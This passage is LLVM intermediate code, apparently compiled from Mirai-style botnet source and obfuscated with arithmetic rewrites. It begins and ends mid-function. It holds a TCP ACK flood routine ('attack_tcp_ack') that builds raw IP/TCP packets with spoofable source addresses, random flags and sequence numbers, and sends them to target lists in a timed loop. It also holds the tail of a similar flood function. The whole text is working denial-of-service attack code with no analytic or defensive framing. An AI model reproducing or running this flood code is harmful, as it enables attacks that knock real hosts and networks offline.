  %557 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %556, i32 0, i32 3
  store i32 %555, i32* %557, align 4
  br label %558

; <label>:558:                                    ; preds = %554, %551
  %559 = load i8, i8* %22, align 1
  %560 = icmp ne i8 %559, 0
  br i1 %560, label %561, label %574

; <label>:561:                                    ; preds = %558
  %562 = call i32 @rand_next()
  %563 = xor i32 %562, -1
  %564 = xor i32 65535, -1
  %565 = xor i32 -1155064278, -1
  %566 = or i32 %563, %564
  %567 = or i32 -1155064278, %565
  %568 = xor i32 %566, -1
  %569 = and i32 %568, %567
  %570 = and i32 %562, 65535
  %571 = trunc i32 %569 to i16
  %572 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %573 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %572, i32 0, i32 7
  store i16 %571, i16* %573, align 2
  br label %574

; <label>:574:                                    ; preds = %561, %558
  %575 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %576 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %575, i32 0, i32 7
  store i16 0, i16* %576, align 2
  %577 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %578 = bitcast %struct.iphdr* %577 to i16*
  %579 = call zeroext i16 @checksum_generic(i16* %578, i32 20)
  %580 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %581 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %580, i32 0, i32 7
  store i16 %579, i16* %581, align 2
  %582 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %583 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %582, i32 0, i32 6
  store i16 0, i16* %583, align 4
  %584 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %585 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %586 = bitcast %struct.tcphdr* %585 to i8*
  %587 = call zeroext i16 @htons(i16 zeroext 40) #7
  %588 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %584, i8* %586, i16 zeroext %587, i32 40)
  %589 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %590 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %589, i32 0, i32 6
  store i16 %588, i16* %590, align 4
  %591 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %592 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %591, i32 0, i32 1
  %593 = load i16, i16* %592, align 2
  %594 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %595 = load i32, i32* %11, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %594, i64 %596
  %598 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %597, i32 0, i32 0
  %599 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %598, i32 0, i32 1
  store i16 %593, i16* %599, align 2
  %600 = load i32, i32* %12, align 4
  %601 = load i8*, i8** %33, align 8
  %602 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %603 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %604 = load i32, i32* %11, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %603, i64 %605
  %607 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %606, i32 0, i32 0
  %608 = bitcast %struct.sockaddr_in* %607 to %struct.sockaddr*
  store %struct.sockaddr* %608, %struct.sockaddr** %602, align 8
  %609 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %610 = load %struct.sockaddr*, %struct.sockaddr** %609, align 8
  %611 = call i64 @sendto(i32 %600, i8* %601, i64 60, i32 16384, %struct.sockaddr* %610, i32 16)
  br label %612

; <label>:612:                                    ; preds = %574
  %613 = load i32, i32* %11, align 4
  %614 = sub i32 0, 1
  %615 = sub i32 %613, %614
  %616 = add nsw i32 %613, 1
  store i32 %615, i32* %11, align 4
  br label %450

; <label>:617:                                    ; preds = %450
  %618 = call i64 @time(i64* null) #6
  %619 = load i32, i32* %29, align 4
  %620 = sext i32 %619 to i64
  %621 = icmp sgt i64 %618, %620
  br i1 %621, label %622, label %623

; <label>:622:                                    ; preds = %617
  br label %624

; <label>:623:                                    ; preds = %617
  br label %449

; <label>:624:                                    ; preds = %622, %115, %109
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i8, align 1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.tcphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %40 = load i8, i8* %7, align 1
  %41 = zext i8 %40 to i64
  %42 = call noalias i8* @calloc(i64 %41, i64 8) #6
  %43 = bitcast i8* %42 to i8**
  store i8** %43, i8*** %13, align 8
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 2, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %14, align 1
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 3, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %15, align 2
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 4, i32 64)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %16, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 5, i32 0)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %17, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 6, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %18, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 7, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %19, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 16, i32 65535)
  store i32 %70, i32* %20, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 17, i32 65535)
  store i32 %73, i32* %21, align 4
  %74 = load i8, i8* %9, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %76 = call i32 @attack_get_opt_int(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 10, i32 0)
  %77 = trunc i32 %76 to i8
  store i8 %77, i8* %22, align 1
  %78 = load i8, i8* %9, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %80 = call i32 @attack_get_opt_int(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 11, i32 1)
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %23, align 1
  %82 = load i8, i8* %9, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %84 = call i32 @attack_get_opt_int(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 12, i32 0)
  %85 = trunc i32 %84 to i8
  store i8 %85, i8* %24, align 1
  %86 = load i8, i8* %9, align 1
  %87 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %88 = call i32 @attack_get_opt_int(i8 zeroext %86, %struct.attack_option* %87, i8 zeroext 13, i32 0)
  %89 = trunc i32 %88 to i8
  store i8 %89, i8* %25, align 1
  %90 = load i8, i8* %9, align 1
  %91 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %92 = call i32 @attack_get_opt_int(i8 zeroext %90, %struct.attack_option* %91, i8 zeroext 14, i32 0)
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %26, align 1
  %94 = load i8, i8* %9, align 1
  %95 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %96 = call i32 @attack_get_opt_int(i8 zeroext %94, %struct.attack_option* %95, i8 zeroext 15, i32 0)
  %97 = trunc i32 %96 to i8
  store i8 %97, i8* %27, align 1
  %98 = load i8, i8* %9, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 0, i32 512)
  store i32 %100, i32* %28, align 4
  %101 = load i8, i8* %9, align 1
  %102 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %103 = call i32 @attack_get_opt_int(i8 zeroext %101, %struct.attack_option* %102, i8 zeroext 1, i32 1)
  %104 = trunc i32 %103 to i8
  store i8 %104, i8* %29, align 1
  %105 = load i8, i8* %9, align 1
  %106 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %107 = load i32, i32* @LOCAL_ADDR, align 4
  %108 = call i32 @attack_get_opt_ip(i8 zeroext %105, %struct.attack_option* %106, i8 zeroext 24, i32 %107)
  store i32 %108, i32* %30, align 4
  %109 = call i64 @time(i64* null) #6
  %110 = load i32, i32* %6, align 4
  %111 = sext i32 %110 to i64
  %112 = sub i64 0, %111
  %113 = sub i64 %109, %112
  %114 = add nsw i64 %109, %111
  %115 = trunc i64 %113 to i32
  store i32 %115, i32* %31, align 4
  %116 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %116, i32* %12, align 4
  %117 = icmp eq i32 %116, -1
  br i1 %117, label %118, label %119

; <label>:118:                                    ; preds = %5
  br label %672

; <label>:119:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %120 = load i32, i32* %12, align 4
  %121 = bitcast i32* %11 to i8*
  %122 = call i32 @setsockopt(i32 %120, i32 0, i32 3, i8* %121, i32 4) #6
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %127

; <label>:124:                                    ; preds = %119
  %125 = load i32, i32* %12, align 4
  %126 = call i32 @close(i32 %125)
  br label %672

; <label>:127:                                    ; preds = %119
  store i32 0, i32* %11, align 4
  br label %128

; <label>:128:                                    ; preds = %470, %127
  %129 = load i32, i32* %11, align 4
  %130 = load i8, i8* %7, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp slt i32 %129, %131
  br i1 %132, label %133, label %475

; <label>:133:                                    ; preds = %128
  %134 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %135 = load i8**, i8*** %13, align 8
  %136 = load i32, i32* %11, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8*, i8** %135, i64 %137
  store i8* %134, i8** %138, align 8
  %139 = load i8**, i8*** %13, align 8
  %140 = load i32, i32* %11, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8*, i8** %139, i64 %141
  %143 = load i8*, i8** %142, align 8
  %144 = bitcast i8* %143 to %struct.iphdr*
  store %struct.iphdr* %144, %struct.iphdr** %32, align 8
  %145 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i64 1
  %147 = bitcast %struct.iphdr* %146 to %struct.tcphdr*
  store %struct.tcphdr* %147, %struct.tcphdr** %33, align 8
  %148 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %148, i64 1
  %150 = bitcast %struct.tcphdr* %149 to i8*
  store i8* %150, i8** %34, align 8
  %151 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %152 = bitcast %struct.iphdr* %151 to i8*
  %153 = load i8, i8* %152, align 4
  %154 = xor i8 15, -1
  %155 = xor i8 %153, %154
  %156 = and i8 %155, %153
  %157 = and i8 %153, 15
  %158 = xor i8 %156, -1
  %159 = xor i8 64, -1
  %160 = xor i8 54, -1
  %161 = and i8 %158, 54
  %162 = and i8 %156, %160
  %163 = and i8 %159, 54
  %164 = and i8 64, %160
  %165 = or i8 %161, %162
  %166 = or i8 %163, %164
  %167 = xor i8 %165, %166
  %168 = or i8 %158, %159
  %169 = xor i8 %168, -1
  %170 = or i8 54, %160
  %171 = and i8 %169, %170
  %172 = or i8 %167, %171
  %173 = or i8 %156, 64
  store i8 %172, i8* %152, align 4
  %174 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %175 = bitcast %struct.iphdr* %174 to i8*
  %176 = load i8, i8* %175, align 4
  %177 = xor i8 -16, -1
  %178 = xor i8 %176, %177
  %179 = and i8 %178, %176
  %180 = and i8 %176, -16
  %181 = xor i8 %179, -1
  %182 = xor i8 5, -1
  %183 = xor i8 11, -1
  %184 = and i8 %181, 11
  %185 = and i8 %179, %183
  %186 = and i8 %182, 11
  %187 = and i8 5, %183
  %188 = or i8 %184, %185
  %189 = or i8 %186, %187
  %190 = xor i8 %188, %189
  %191 = or i8 %181, %182
  %192 = xor i8 %191, -1
  %193 = or i8 11, %183
  %194 = and i8 %192, %193
  %195 = or i8 %190, %194
  %196 = or i8 %179, 5
  store i8 %195, i8* %175, align 4
  %197 = load i8, i8* %14, align 1
  %198 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 1
  store i8 %197, i8* %199, align 1
  %200 = load i32, i32* %28, align 4
  %201 = sext i32 %200 to i64
  %202 = sub i64 0, %201
  %203 = sub i64 40, %202
  %204 = add i64 40, %201
  %205 = trunc i64 %203 to i16
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 2
  store i16 %206, i16* %208, align 2
  %209 = load i16, i16* %15, align 2
  %210 = call zeroext i16 @htons(i16 zeroext %209) #7
  %211 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 3
  store i16 %210, i16* %212, align 4
  %213 = load i8, i8* %16, align 1
  %214 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 5
  store i8 %213, i8* %215, align 4
  %216 = load i8, i8* %17, align 1
  %217 = icmp ne i8 %216, 0
  br i1 %217, label %218, label %222

; <label>:218:                                    ; preds = %133
  %219 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %220 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 4
  store i16 %219, i16* %221, align 2
  br label %222

; <label>:222:                                    ; preds = %218, %133
  %223 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 6
  store i8 6, i8* %224, align 1
  %225 = load i32, i32* %30, align 4
  %226 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 8
  store i32 %225, i32* %227, align 4
  %228 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %229 = load i32, i32* %11, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %228, i64 %230
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %231, i32 0, i32 1
  %233 = load i32, i32* %232, align 4
  %234 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 9
  store i32 %233, i32* %235, align 4
  %236 = load i16, i16* %18, align 2
  %237 = call zeroext i16 @htons(i16 zeroext %236) #7
  %238 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 0
  store i16 %237, i16* %239, align 4
  %240 = load i16, i16* %19, align 2
  %241 = call zeroext i16 @htons(i16 zeroext %240) #7
  %242 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %243 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %242, i32 0, i32 1
  store i16 %241, i16* %243, align 2
  %244 = load i32, i32* %20, align 4
  %245 = trunc i32 %244 to i16
  %246 = call zeroext i16 @htons(i16 zeroext %245) #7
  %247 = zext i16 %246 to i32
  %248 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 2
  store i32 %247, i32* %249, align 4
  %250 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 4
  %252 = load i16, i16* %251, align 4
  %253 = xor i16 -241, -1
  %254 = xor i16 %252, %253
  %255 = and i16 %254, %252
  %256 = and i16 %252, -241
  %257 = and i16 %255, 80
  %258 = xor i16 %255, 80
  %259 = or i16 %257, %258
  %260 = or i16 %255, 80
  store i16 %259, i16* %251, align 4
  %261 = load i8, i8* %22, align 1
  %262 = sext i8 %261 to i16
  %263 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 4
  %265 = load i16, i16* %264, align 4
  %266 = xor i16 1, -1
  %267 = xor i16 %262, %266
  %268 = and i16 %267, %262
  %269 = and i16 %262, 1
  %270 = shl i16 %268, 13
  %271 = xor i16 %265, -1
  %272 = xor i16 -8193, -1
  %273 = xor i16 13516, -1
  %274 = or i16 %271, %272
  %275 = or i16 13516, %273
  %276 = xor i16 %274, -1
  %277 = and i16 %276, %275
  %278 = and i16 %265, -8193
  %279 = xor i16 %277, -1
  %280 = xor i16 %270, -1
  %281 = xor i16 14767, -1
  %282 = and i16 %279, 14767
  %283 = and i16 %277, %281
  %284 = and i16 %280, 14767
  %285 = and i16 %270, %281
  %286 = or i16 %282, %283
  %287 = or i16 %284, %285
  %288 = xor i16 %286, %287
  %289 = or i16 %279, %280
  %290 = xor i16 %289, -1
  %291 = or i16 14767, %281
  %292 = and i16 %290, %291
  %293 = or i16 %288, %292
  %294 = or i16 %277, %270
  store i16 %293, i16* %264, align 4
  %295 = load i8, i8* %23, align 1
  %296 = sext i8 %295 to i16
  %297 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %298 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %297, i32 0, i32 4
  %299 = load i16, i16* %298, align 4
  %300 = xor i16 1, -1
  %301 = xor i16 %296, %300
  %302 = and i16 %301, %296
  %303 = and i16 %296, 1
  %304 = shl i16 %302, 12
  %305 = xor i16 %299, -1
  %306 = xor i16 -4097, -1
  %307 = xor i16 22191, -1
  %308 = or i16 %305, %306
  %309 = or i16 22191, %307
  %310 = xor i16 %308, -1
  %311 = and i16 %310, %309
  %312 = and i16 %299, -4097
  %313 = and i16 %311, %304
  %314 = xor i16 %311, %304
  %315 = or i16 %313, %314
  %316 = or i16 %311, %304
  store i16 %315, i16* %298, align 4
  %317 = load i8, i8* %24, align 1
  %318 = sext i8 %317 to i16
  %319 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %320 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %319, i32 0, i32 4
  %321 = load i16, i16* %320, align 4
  %322 = xor i16 %318, -1
  %323 = xor i16 1, -1
  %324 = xor i16 32488, -1
  %325 = or i16 %322, %323
  %326 = or i16 32488, %324
  %327 = xor i16 %325, -1
  %328 = and i16 %327, %326
  %329 = and i16 %318, 1
  %330 = shl i16 %328, 11
  %331 = xor i16 -2049, -1
  %332 = xor i16 %321, %331
  %333 = and i16 %332, %321
  %334 = and i16 %321, -2049
  %335 = xor i16 %333, -1
  %336 = xor i16 %330, -1
  %337 = xor i16 8340, -1
  %338 = and i16 %335, 8340
  %339 = and i16 %333, %337
  %340 = and i16 %336, 8340
  %341 = and i16 %330, %337
  %342 = or i16 %338, %339
  %343 = or i16 %340, %341
  %344 = xor i16 %342, %343
  %345 = or i16 %335, %336
  %346 = xor i16 %345, -1
  %347 = or i16 8340, %337
  %348 = and i16 %346, %347
  %349 = or i16 %344, %348
  %350 = or i16 %333, %330
  store i16 %349, i16* %320, align 4
  %351 = load i8, i8* %25, align 1
  %352 = sext i8 %351 to i16
  %353 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %354 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %353, i32 0, i32 4
  %355 = load i16, i16* %354, align 4
  %356 = xor i16 1, -1
  %357 = xor i16 %352, %356
  %358 = and i16 %357, %352
  %359 = and i16 %352, 1
  %360 = shl i16 %358, 10
  %361 = xor i16 -1025, -1
  %362 = xor i16 %355, %361
  %363 = and i16 %362, %355
  %364 = and i16 %355, -1025
  %365 = xor i16 %363, -1
  %366 = xor i16 %360, -1
  %367 = xor i16 6288, -1
  %368 = and i16 %365, 6288
  %369 = and i16 %363, %367
  %370 = and i16 %366, 6288
  %371 = and i16 %360, %367
  %372 = or i16 %368, %369
  %373 = or i16 %370, %371
  %374 = xor i16 %372, %373
  %375 = or i16 %365, %366
  %376 = xor i16 %375, -1
  %377 = or i16 6288, %367
  %378 = and i16 %376, %377
  %379 = or i16 %374, %378
  %380 = or i16 %363, %360
  store i16 %379, i16* %354, align 4
  %381 = load i8, i8* %26, align 1
  %382 = sext i8 %381 to i16
  %383 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %384 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %383, i32 0, i32 4
  %385 = load i16, i16* %384, align 4
  %386 = xor i16 1, -1
  %387 = xor i16 %382, %386
  %388 = and i16 %387, %382
  %389 = and i16 %382, 1
  %390 = shl i16 %388, 9
  %391 = xor i16 -513, -1
  %392 = xor i16 %385, %391
  %393 = and i16 %392, %385
  %394 = and i16 %385, -513
  %395 = and i16 %393, %390
  %396 = xor i16 %393, %390
  %397 = or i16 %395, %396
  %398 = or i16 %393, %390
  store i16 %397, i16* %384, align 4
  %399 = load i8, i8* %27, align 1
  %400 = sext i8 %399 to i16
  %401 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %402 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %401, i32 0, i32 4
  %403 = load i16, i16* %402, align 4
  %404 = xor i16 %400, -1
  %405 = xor i16 1, -1
  %406 = xor i16 31080, -1
  %407 = or i16 %404, %405
  %408 = or i16 31080, %406
  %409 = xor i16 %407, -1
  %410 = and i16 %409, %408
  %411 = and i16 %400, 1
  %412 = shl i16 %410, 8
  %413 = xor i16 -257, -1
  %414 = xor i16 %403, %413
  %415 = and i16 %414, %403
  %416 = and i16 %403, -257
  %417 = xor i16 %415, -1
  %418 = xor i16 %412, -1
  %419 = xor i16 -3617, -1
  %420 = and i16 %417, -3617
  %421 = and i16 %415, %419
  %422 = and i16 %418, -3617
  %423 = and i16 %412, %419
  %424 = or i16 %420, %421
  %425 = or i16 %422, %423
  %426 = xor i16 %424, %425
  %427 = or i16 %417, %418
  %428 = xor i16 %427, -1
  %429 = or i16 -3617, %419
  %430 = and i16 %428, %429
  %431 = or i16 %426, %430
  %432 = or i16 %415, %412
  store i16 %431, i16* %402, align 4
  %433 = call i32 @rand_next()
  %434 = xor i32 %433, -1
  %435 = xor i32 65535, -1
  %436 = xor i32 189117325, -1
  %437 = or i32 %434, %435
  %438 = or i32 189117325, %436
  %439 = xor i32 %437, -1
  %440 = and i32 %439, %438
  %441 = and i32 %433, 65535
  %442 = trunc i32 %440 to i16
  %443 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %444 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %443, i32 0, i32 5
  store i16 %442, i16* %444, align 2
  %445 = load i8, i8* %24, align 1
  %446 = icmp ne i8 %445, 0
  br i1 %446, label %447, label %463

; <label>:447:                                    ; preds = %222
  %448 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %449 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %448, i32 0, i32 4
  %450 = load i16, i16* %449, align 4
  %451 = xor i16 %450, -1
  %452 = xor i16 -2049, -1
  %453 = xor i16 9405, -1
  %454 = or i16 %451, %452
  %455 = or i16 9405, %453
  %456 = xor i16 %454, -1
  %457 = and i16 %456, %455
  %458 = and i16 %450, -2049
  %459 = and i16 %457, 2048
  %460 = xor i16 %457, 2048
  %461 = or i16 %459, %460
  %462 = or i16 %457, 2048
  store i16 %461, i16* %449, align 4
  br label %463

; <label>:463:                                    ; preds = %447, %222
  %464 = load i8*, i8** %34, align 8
  %465 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %464, i32 %465)
  %466 = load i8*, i8** %34, align 8
  %467 = load i32, i32* %28, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds i8, i8* %466, i64 %468
  store i8 0, i8* %469, align 1
  br label %470

; <label>:470:                                    ; preds = %463
  %471 = load i32, i32* %11, align 4
  %472 = sub i32 0, 1
  %473 = sub i32 %471, %472
  %474 = add nsw i32 %471, 1
  store i32 %473, i32* %11, align 4
  br label %128

; <label>:475:                                    ; preds = %128
  br label %476

; <label>:476:                                    ; preds = %671, %475
  store i32 0, i32* %11, align 4
  br label %477

; <label>:477:                                    ; preds = %659, %476
  %478 = load i32, i32* %11, align 4
  %479 = load i8, i8* %7, align 1
  %480 = zext i8 %479 to i32
  %481 = icmp slt i32 %478, %480
  br i1 %481, label %482, label %665

; <label>:482:                                    ; preds = %477
  %483 = load i8**, i8*** %13, align 8
  %484 = load i32, i32* %11, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds i8*, i8** %483, i64 %485
  %487 = load i8*, i8** %486, align 8
  store i8* %487, i8** %35, align 8
  %488 = load i8*, i8** %35, align 8
  %489 = bitcast i8* %488 to %struct.iphdr*
  store %struct.iphdr* %489, %struct.iphdr** %36, align 8
  %490 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %491 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %490, i64 1
  %492 = bitcast %struct.iphdr* %491 to %struct.tcphdr*
  store %struct.tcphdr* %492, %struct.tcphdr** %37, align 8
  %493 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %494 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %493, i64 1
  %495 = bitcast %struct.tcphdr* %494 to i8*
  store i8* %495, i8** %38, align 8
  %496 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %497 = load i32, i32* %11, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %496, i64 %498
  %500 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %499, i32 0, i32 2
  %501 = load i8, i8* %500, align 4
  %502 = zext i8 %501 to i32
  %503 = icmp slt i32 %502, 32
  br i1 %503, label %504, label %528

; <label>:504:                                    ; preds = %482
  %505 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %506 = load i32, i32* %11, align 4
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %505, i64 %507
  %509 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %508, i32 0, i32 1
  %510 = load i32, i32* %509, align 4
  %511 = call i32 @ntohl(i32 %510) #7
  %512 = call i32 @rand_next()
  %513 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %514 = load i32, i32* %11, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %513, i64 %515
  %517 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %516, i32 0, i32 2
  %518 = load i8, i8* %517, align 4
  %519 = zext i8 %518 to i32
  %520 = lshr i32 %512, %519
  %521 = add i32 %511, 759252905
  %522 = add i32 %521, %520
  %523 = sub i32 %522, 759252905
  %524 = add i32 %511, %520
